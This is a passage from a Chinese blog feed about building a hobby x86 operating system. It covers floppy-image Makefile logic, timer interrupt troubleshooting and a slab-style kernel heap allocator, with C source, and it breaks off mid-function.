<p>自动计算扇区数并加入软盘方式如下，需要更改<strong>makefile</strong>最后生成<strong>TARGET</strong>软盘文件的逻辑：</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="variable">$(TARGET)</span>: <span class="variable">$(BOOT_BIN)</span> <span class="variable">$(STAGE2_BIN)</span> <span class="variable">$(KERNEL_BIN)</span></span><br><span class="line">	@echo <span class="string">&quot;Creating floppy image...&quot;</span></span><br><span class="line">	dd if=/dev/zero of=<span class="variable">$(TARGET)</span> bs=512 count=2880                    </span><br><span class="line">	dd if=<span class="variable">$(BOOT_BIN)</span> of=<span class="variable">$(TARGET)</span> bs=512 count=1 conv=notrunc           </span><br><span class="line">	dd if=<span class="variable">$(STAGE2_BIN)</span> of=<span class="variable">$(TARGET)</span> bs=512 count=2 seek=1 conv=notrunc  </span><br><span class="line">	@KERNEL_SIZE=$<span class="variable">$(stat -c %s <span class="variable">$(KERNEL_BIN)</span>)</span>; \</span><br><span class="line">	KERNEL_SECTORS=$$((($$KERNEL_SIZE + 511) / 512)); \</span><br><span class="line">	echo <span class="string">&quot;Kernel size: $$KERNEL_SIZE bytes ($$KERNEL_SECTORS sectors)&quot;</span>; \</span><br><span class="line">	dd if=<span class="variable">$(KERNEL_BIN)</span> of=<span class="variable">$(TARGET)</span> bs=512 count=$$KERNEL_SECTORS seek=3 conv=notrunc</span><br></pre></td></tr></table></figure></div>
<h4 id="timer无响应">timer无响应</h4>
<p>由于我的<strong>isr_handler</strong>设计上是只要接受到中断就先打印中断号，所以如果屏幕上没有打印任何内容，说明并没有接受到外部中断。</p>
<p>首先是需要在加载完irq以及isr后手动用<code>sti</code>开启中断，<code>sti</code>
是 x86 指令，用于设置 <strong>中断标志位 IF（Interrupt
Flag）</strong>，允许 CPU 响应硬件中断（IRQ）。</p>
<p>其次我们需要单独为irq实现一个handler，因为在 <strong>IRQ
的中断服务程序（IRQ handler）</strong> 中，<strong>必须手动发送
EOI</strong> 给主/从 8259A PIC，否则 PIC 会认为该中断尚未处理完成，从而
<strong>不会发出新的中断请求</strong>。</p>
<p>之后遇到的问题是跳转后好像指令没有加载出来，发现问题可能在于我们之前boot.asm中映射空间大小写死为读取5个扇区，而这里我们的kernel已经超出了5个扇区的大小了，所以最后只加载了一半。那么我们在boot.asm中多申请点读取扇区大小即可。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/05/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/image-20250508001508207.png"
                      class=""
                >
]]></content>
      <categories>
        <category>OS</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始搭建自制操作系统——简单内核堆分配器实现</title>
    <url>/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<p>这里借鉴slab/slub分配器的思想，往最简单实现一个内核堆分配器。之前我们已经用<strong>buddy
system</strong>实现了物理内存分配器（PMM），也开启分页机制，可以利用虚拟地址。因为PMM分配内存是以页（4KB，0x1000）为粒度的，如果申请一小块结构体的内存就需要申请一整页的内存就过于浪费，所以slab分配器的核心功能是分配远小于一页大小的内存。</p>
<h3 id="主体分配逻辑">主体分配逻辑</h3>
<p>从PMM中申请到的一页内存可以内部划分成多个指定大小的内存块，这样的一页内存这里我称为是<strong>slab_page</strong>，而<strong>slab_page</strong>中的多个可划分内存块我称为是<strong>slab_obj</strong>。其中管理同一大小的<strong>slab_page</strong>用一个链表串联起来。一个<strong>slab_page</strong>内部可以采用<strong>bitmap</strong>或是<strong>freelist</strong>来管理其内部的内存块。用<strong>freelist</strong>管理的好处是可以快速进行分配，避免了使用<strong>bitmap</strong>时顺序查找第一个空闲块的过程，而且<strong>freelist</strong>管理时头部插入也比较方便，最近释放的块可以最先被分配出来，这样就可以提高TLB命中率和CPU
Cache 命中率，性能上表现也比较好。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/06/08/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E6%90%AD%E5%BB%BA%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8%E5%AE%9E%E7%8E%B0/demo.drawio.png"
                      class=""
                >
<p>然后我们可以设计三种缓存状态（full、partial、empty）的链表来分别管理全部分配满，部分分配以及全部未分配的<strong>slab_page</strong>，这样子做有很多好处。比如当我们分配完一个chunk，发现当前的<strong>slab_page</strong>已经全部占满（即<strong>freelist</strong>为空），则可以直接放到full链表中，full链表里的<strong>slab_page</strong>不参与未来分配，因为该页已经没有可分配对象，所以分配器跳过这类页，减少遍历时间。而<strong>empty</strong>链表则暂时存着全空的<strong>slab_page</strong>，而不是直接将物理内存释放的好处是<strong>快速复用</strong>，不需要重新申请页就可以重新初始化使用，省去了向物理内存申请页的成本。在极端情况下，我们申请一个堆块释放一个堆块，由于每次释放后freelist都为全空，如果不进行暂存的话，每次申请和释放就都需要调用PMM的接口来频繁申请/释放内存。将empty链表里的内存归还给物理内存的时机很有讲究，一般<strong>shrink</strong>的时机都是当empty链表存的<strong>slab_page</strong>超过了某个阈值时再进行全部释放。这里的三个链表我们用一个<strong>cache</strong>结构体来进行管理，一个<strong>cache</strong>负责一个固定大小的内存分配。</p>
<p>我们申请某个大小小于一页的内存，可以先判断大于请求大小的最小size的<strong>cache</strong>的partial是否为空，不空则可以直接从<strong>partial</strong>的<strong>freelist</strong>中直接取一个<strong>slab_obj</strong>作为分配的堆内存；否则尝试从<strong>empty</strong>链表取一个<strong>slab_page</strong>重新放回<strong>partial</strong>中；如果前两个尝试都失败了，最后就会调用PMM的接口去申请一段物理内存并手动建立好页表映射，加入到<strong>partial</strong>表中。最后就可以分配到堆内存。</p>
<p>这里我们发现实际上还需要申请物理内存并建立页表映射，物理内存分配的细节我们可以不关注（全交给pmm），但我们需要映射到的虚拟地址需要我们进行设计。这里我直接采用线性的方式来得到映射的虚拟地址，也就是说即使释放了某段虚拟地址对应的物理地址并接触了页表映射，这个用过的虚拟地址也不会再进行使用，分配的虚拟地址不断往高虚拟地址处增长。可以这样做的原因在于我们实际可用的虚拟地址较大，而且也不会浪费到实际的物理内存，在我们目前开发的初期可以不用实现繁琐的虚拟地址分配管理。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">slab_page</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_page_t</span> *<span class="title">next</span>;</span>             <span class="comment">// 指向下一个slab page</span></span><br><span class="line">    <span class="type">uint32_t</span> vaddr;                     <span class="comment">// 其obj页的虚拟地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_object_t</span> *<span class="title">freelist</span>;</span>            <span class="comment">// 指向空闲对象链表（对象内维护 next 指针）</span></span><br><span class="line">    <span class="type">uint32_t</span> used_count;                <span class="comment">// 已使用的对象数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_cache</span> *<span class="title">owner_cache</span>;</span>     <span class="comment">// slab page 所属的 slab cache</span></span><br><span class="line">    <span class="type">uint8_t</span>  bitmap[<span class="number">16</span>];               <span class="comment">// 最多支持 128 个对象（2048 / 16）,128/8=16</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_page_t</span> *<span class="title">next_hash</span>;</span>        <span class="comment">// hash table 中的下一个 slab page</span></span><br><span class="line">&#125; <span class="type">slab_page_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">slab_cache</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> object_size;</span><br><span class="line">    <span class="type">slab_page_t</span> *partial;</span><br><span class="line">    <span class="type">slab_page_t</span> *full;</span><br><span class="line">    <span class="type">slab_page_t</span> *empty;         <span class="comment">// lazy shrink 时启用</span></span><br><span class="line">    <span class="type">size_t</span> empty_count;</span><br><span class="line">&#125; <span class="type">slab_cache_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">slab_object</span> &#123;</span>        <span class="comment">// slab page 内部管理的对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_object</span> *<span class="title">next</span>;</span></span><br><span class="line">    </span><br><span class="line">&#125; <span class="type">slab_object_t</span>;</span><br></pre></td></tr></table></figure></div>
<h3 id="动态-slab_page-元数据管理设计">动态 slab_page
元数据管理设计</h3>
<p>实际上我们还需要一片区域来存slab_page的这个结构体，一种可行的方案是让在初始化<strong>free_list</strong>时就保留前面结构体大小的空间，后面的空间再用来存对应的内存分配对象<strong>obj</strong>，再相应调整<strong>bitmap</strong>的寻址逻辑即可。但这种设计会减少每个<strong>slab_page</strong>能够管理的<strong>obj</strong>数量，极端情况下，比如2048大小的块管理，由于1页空间为4096，本来一个<strong>slab_page</strong>可以管2个<strong>obj</strong>，如果预留了<strong>slab_page</strong>结构体的空间，那么就只能存下1个<strong>obj</strong>，那么我们可以单独为存这个
<strong>slab_page</strong>
结构体设计一个申请释放逻辑。这里我们的<strong>slab_page</strong>结构体的内存实际上作为<strong>slab_obj</strong>进行管理，<strong>slab_page_meta_chunk</strong>可以存很多个<strong>slab_page</strong>，同样也是用链表的分配逻辑。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_PAGE_META_PER_PAGE (4096 / sizeof(slab_page_t))    <span class="comment">// 每页最多可以存的slab page结构体个数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">slab_page_meta_chunk</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_page_meta_chunk</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">slab_page_t</span> entries[SLAB_PAGE_META_PER_PAGE];  <span class="comment">// 一页中的 struct 数组</span></span><br><span class="line">&#125; <span class="type">slab_page_meta_chunk_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">slab_page_meta_chunk_t</span> *meta_chunk_list = <span class="literal">NULL</span>;      <span class="comment">// 存slab page元数据结构体的一个特制slab page</span></span><br><span class="line"><span class="type">static</span> <span class="type">slab_page_t</span> *meta_free_list = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">slab_page_t</span> *slab_page_map[SLAB_PAGE_HASH_SIZE];     <span class="comment">// slab page哈希表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">slab_page_hash</span><span class="params">(<span class="type">uintptr_t</span> vaddr)</span> &#123;  <span class="comment">// hash function</span></span><br><span class="line">    <span class="keyword">return</span> (vaddr &gt;&gt; <span class="number">12</span>) % SLAB_PAGE_HASH_SIZE; <span class="comment">// 每页对齐</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">remove_slab_page_from_hash</span><span class="params">(<span class="type">slab_page_t</span> *page)</span>&#123;</span><br><span class="line">    <span class="comment">// 从 slab_page_map 中移除</span></span><br><span class="line">    <span class="type">size_t</span> index = slab_page_hash((<span class="type">uintptr_t</span>)page-&gt;vaddr);</span><br><span class="line">    <span class="type">slab_page_t</span> **cur = &amp;slab_page_map[index];</span><br><span class="line">    <span class="keyword">while</span> (*cur) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*cur == page) &#123;</span><br><span class="line">            *cur = page-&gt;next_hash;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = &amp;(*cur)-&gt;next_hash;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _alloc_slab_page_meta() &#123;          <span class="comment">// 往PMM发起请求申请一块物理空间</span></span><br><span class="line">    <span class="type">void</span> *vaddr = alloc_heap_page();  <span class="comment">// 分配一页</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">slab_page_meta_chunk_t</span> *chunk = (<span class="type">slab_page_meta_chunk_t</span> *)vaddr;</span><br><span class="line">    chunk-&gt;next = meta_chunk_list;</span><br><span class="line">    meta_chunk_list = chunk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = SLAB_PAGE_META_PER_PAGE - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="comment">// 逐个将slab page元数据结构体放入freelist</span></span><br><span class="line">        <span class="type">slab_page_t</span> *page = &amp;chunk-&gt;entries[i];</span><br><span class="line">        ((<span class="type">slab_object_t</span> *)page)-&gt;next = meta_free_list;</span><br><span class="line">        meta_free_list = (<span class="type">slab_object_t</span> *)page;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">slab_page_t</span> *<span class="title function_">alloc_slab_page_meta</span><span class="params">()</span> &#123;           <span class="comment">// 申请存slab page结构体的空间</span></span><br><span class="line">    <span class="keyword">if</span> (!meta_free_list) &#123;</span><br><span class="line">        _alloc_slab_page_meta();  <span class="comment">// 自动扩展</span></span><br><span class="line">        <span class="keyword">if</span> (!meta_free_list) <span class="keyword">return</span> <span class="literal">NULL</span>;  <span class="comment">// OOM fallback</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">slab_page_t</span> *page = (<span class="type">slab_page_t</span> *)meta_free_list;</span><br><span class="line">    meta_free_list = meta_free_list-&gt;next;</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">slab_page_t</span>));</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_slab_page_meta</span><span class="params">(<span class="type">slab_page_t</span> *page)</span> &#123;       <span class="comment">// 释放一个 slab page 元数据结构体</span></span><br><span class="line">    ((<span class="type">slab_object_t</span> *)page)-&gt;next = meta_free_list;</span><br><span class="line">    meta_free_list = (<span class="type">slab_object_t</span> *)page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于我们之后实现<strong>slab_free</strong>时，需要通过一个<strong>slab_obj</strong>的地址来反过来查出所属的<strong>slab_page</strong>，而我们的<strong>slab_page</strong>结构体存的位置和其<strong>obj</strong>的位置是分离的。所以我们需要维护一个<strong>hash
table</strong>，从而可以从obj所在的虚拟地址页高效查出对应<strong>slab_page</strong>。这里我们还需要解决hash冲突的问题，所以在前面的<strong>slab_page</strong>中定义了一个<strong>next_hash</strong>的字段来管理一个链表，从而在hash冲突时可以通过遍历这个链表来找到对应<strong>slab_page</strong>。</p>
<h3 id="基本实现">基本实现</h3>
<p>其中我保留了bitmap在<strong>slab_page</strong>结构体中，主要是为了可以方便判断是否存在<strong>double
free</strong>，也可以快速定位到某页内存中哪些空间已经被分配利用。</p>
<p>其中向PMM申请内存并进行页表映射操作都被封装进了<strong>alloc_heap_page</strong>()这个函数中，分配堆内存时只有在对应管理结构的链表的freelist全为空时才会用这个接口去申请物理内存，而且虚拟堆地址的增长也是在这个函数里完成的。</p>
<p>最后我还实现了一个<strong>dump_slab_cache_partial_freelist</strong>接口来用于打印partial的freelist从而进行调试。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// memory/slab.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_BASE       0xC1000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_MAX_SIZE   0x01000000  <span class="comment">// 16MB</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE       4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_MIN_SIZE   16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_MAX_SIZE   2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_STEP       16</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_SLAB_CLASSES ((SLAB_MAX_SIZE / SLAB_STEP) + 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_PAGE_META_PER_PAGE (4096 / sizeof(slab_page_t))    <span class="comment">// 每页最多可以存的slab page结构体个数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_EMPTY_PAGES 8   <span class="comment">// 阈值,empty链表长度超过阈值时,释放空闲页</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SLAB_PAGE_HASH_SIZE 4096    <span class="comment">// hash table 大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">slab_page</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_page_t</span> *<span class="title">next</span>;</span>             <span class="comment">// 指向下一个slab page</span></span><br><span class="line">    <span class="type">uint32_t</span> vaddr;                     <span class="comment">// 其obj页的虚拟地址</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_object_t</span> *<span class="title">freelist</span>;</span>            <span class="comment">// 指向空闲对象链表（对象内维护 next 指针）</span></span><br><span class="line">    <span class="type">uint32_t</span> used_count;                <span class="comment">// 已使用的对象数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_cache</span> *<span class="title">owner_cache</span>;</span>     <span class="comment">// slab page 所属的 slab cache</span></span><br><span class="line">    <span class="type">uint8_t</span>  bitmap[<span class="number">16</span>];               <span class="comment">// 最多支持 128 个对象（2048 / 16）,128/8=16</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_page_t</span> *<span class="title">next_hash</span>;</span>        <span class="comment">// hash table 中的下一个 slab page</span></span><br><span class="line">&#125; <span class="type">slab_page_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">slab_cache</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> object_size;</span><br><span class="line">    <span class="type">slab_page_t</span> *partial;</span><br><span class="line">    <span class="type">slab_page_t</span> *full;</span><br><span class="line">    <span class="type">slab_page_t</span> *empty;         <span class="comment">// lazy shrink 时启用</span></span><br><span class="line">    <span class="type">size_t</span> empty_count;</span><br><span class="line">&#125; <span class="type">slab_cache_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">slab_object</span> &#123;</span>        <span class="comment">// slab page 内部管理的对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_object</span> *<span class="title">next</span>;</span></span><br><span class="line">    </span><br><span class="line">&#125; <span class="type">slab_object_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">slab_page_meta_chunk</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab_page_meta_chunk</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">slab_page_t</span> entries[SLAB_PAGE_META_PER_PAGE];  <span class="comment">// 一页中的 struct 数组</span></span><br><span class="line">&#125; <span class="type">slab_page_meta_chunk_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// typedef struct meta_free_list_node &#123;      // 用于meta_free_list链表</span></span><br><span class="line"><span class="comment">//     struct meta_free_list_node_t *next;</span></span><br><span class="line"><span class="comment">//     slab_page_t *page;</span></span><br><span class="line"><span class="comment">// &#125; meta_free_list_node_t;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">slab_init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">slab_alloc</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">slab_free</span><span class="params">(<span class="type">void</span> * ptr)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init_freelist</span><span class="params">(<span class="type">slab_page_t</span> *page, <span class="type">size_t</span> object_size)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">add_to_list</span><span class="params">(<span class="type">slab_page_t</span> **<span class="built_in">list</span>, <span class="type">slab_page_t</span> *page)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">remove_from_list</span><span class="params">(<span class="type">slab_page_t</span> **<span class="built_in">list</span>, <span class="type">slab_page_t</span> *page)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">alloc_heap_page</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">slab_page_t</span>* <span class="title function_">get_slab_page</span><span class="params">(<span class="type">void</span> *vaddr)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dump_slab_cache_partial_freelist</span><span class="params">(<span class="type">size_t</span> size)</span>;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// memory/slab.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;slab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pmm.h&quot;</span>  <span class="comment">// 物理页分配器</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;vmm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;printf.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;common.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">slab_cache_t</span> slab_caches[NUM_SLAB_CLASSES];          <span class="comment">// 每个大小设置一个缓存</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> heap_next_free = HEAP_BASE;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">slab_page_meta_chunk_t</span> *meta_chunk_list = <span class="literal">NULL</span>;      <span class="comment">// 存slab page元数据结构体的一个特制slab page</span></span><br><span class="line"><span class="type">static</span> <span class="type">slab_page_t</span> *meta_free_list = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">slab_page_t</span> *slab_page_map[SLAB_PAGE_HASH_SIZE];     <span class="comment">// slab page哈希表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">slab_page_hash</span><span class="params">(<span class="type">uintptr_t</span> vaddr)</span> &#123;  <span class="comment">// hash function</span></span><br><span class="line">    <span class="keyword">return</span> (vaddr &gt;&gt; <span class="number">12</span>) % SLAB_PAGE_HASH_SIZE; <span class="comment">// 每页对齐</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">remove_slab_page_from_hash</span><span class="params">(<span class="type">slab_page_t</span> *page)</span>&#123;</span><br><span class="line">    <span class="comment">// 从 slab_page_map 中移除</span></span><br><span class="line">    <span class="type">size_t</span> index = slab_page_hash((<span class="type">uintptr_t</span>)page-&gt;vaddr);</span><br><span class="line">    <span class="type">slab_page_t</span> **cur = &amp;slab_page_map[index];</span><br><span class="line">    <span class="keyword">while</span> (*cur) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*cur == page) &#123;</span><br><span class="line">            *cur = page-&gt;next_hash;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = &amp;(*cur)-&gt;next_hash;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _alloc_slab_page_meta() &#123;          <span class="comment">// 往PMM发起请求申请一块物理空间</span></span><br><span class="line">    <span class="type">void</span> *vaddr = alloc_heap_page();  <span class="comment">// 分配一页</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">slab_page_meta_chunk_t</span> *chunk = (<span class="type">slab_page_meta_chunk_t</span> *)vaddr;</span><br><span class="line">    chunk-&gt;next = meta_chunk_list;</span><br><span class="line">    meta_chunk_list = chunk;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = SLAB_PAGE_META_PER_PAGE - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="comment">// 逐个将slab page元数据结构体放入freelist</span></span><br><span class="line">        <span class="type">slab_page_t</span> *page = &amp;chunk-&gt;entries[i];</span><br><span class="line">        ((<span class="type">slab_object_t</span> *)page)-&gt;next = meta_free_list;</span><br><span class="line">        meta_free_list = (<span class="type">slab_object_t</span> *)page;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">slab_page_t</span> *<span class="title function_">alloc_slab_page_meta</span><span class="params">()</span> &#123;           <span class="comment">// 申请存slab page结构体的空间</span></span><br><span class="line">    <span class="keyword">if</span> (!meta_free_list) &#123;</span><br><span class="line">        _alloc_slab_page_meta();  <span class="comment">// 自动扩展</span></span><br><span class="line">        <span class="keyword">if</span> (!meta_free_list) <span class="keyword">return</span> <span class="literal">NULL</span>;  <span class="comment">// OOM fallback</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">slab_page_t</span> *page = (<span class="type">slab_page_t</span> *)meta_free_list;</span><br><span class="line">    meta_free_list = meta_free_list-&gt;next;</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">slab_page_t</span>));</span><br><span class="line">    <span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_slab_page_meta</span><span class="params">(<span class="type">slab_page_t</span> *page)</span> &#123;       <span class="comment">// 释放一个 slab page 元数据结构体</span></span><br><span class="line">    ((<span class="type">slab_object_t</span> *)page)-&gt;next = meta_free_list;</span><br><span class="line">    meta_free_list = (<span class="type">slab_object_t</span> *)page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">slab_index</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取 slab 索引</span></span><br><span class="line">    <span class="keyword">if</span> (size &gt; SLAB_MAX_SIZE) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> idx = (size - <span class="number">1</span>) / SLAB_STEP;       </span><br><span class="line">    <span class="keyword">return</span> idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">alloc_heap_page</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (heap_next_free &gt;= HEAP_BASE + HEAP_MAX_SIZE) <span class="keyword">return</span> <span class="number">0</span>;          <span class="comment">// 堆已满</span></span><br><span class="line">    <span class="type">uint32_t</span> vaddr = heap_next_free;</span><br><span class="line">    heap_next_free += PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> phys = pmm_alloc_page();</span><br><span class="line">    <span class="keyword">if</span> (!phys) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    map_page(vaddr, phys, PAGE_RW|PAGE_PRESENT);  <span class="comment">// present + writable</span></span><br><span class="line">    <span class="keyword">if</span> (DEBUG) kernel_printf(<span class="string">&quot;alloc_heap_page: %x\n&quot;</span>, vaddr);</span><br><span class="line">    <span class="keyword">return</span> vaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_heap_page</span><span class="params">(<span class="type">slab_page_t</span> *page)</span>&#123;</span><br><span class="line">    unmap_page(page-&gt;vaddr);</span><br><span class="line">    free_slab_page_meta(page);</span><br><span class="line">    remove_slab_page_from_hash(page);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">slab_init</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; 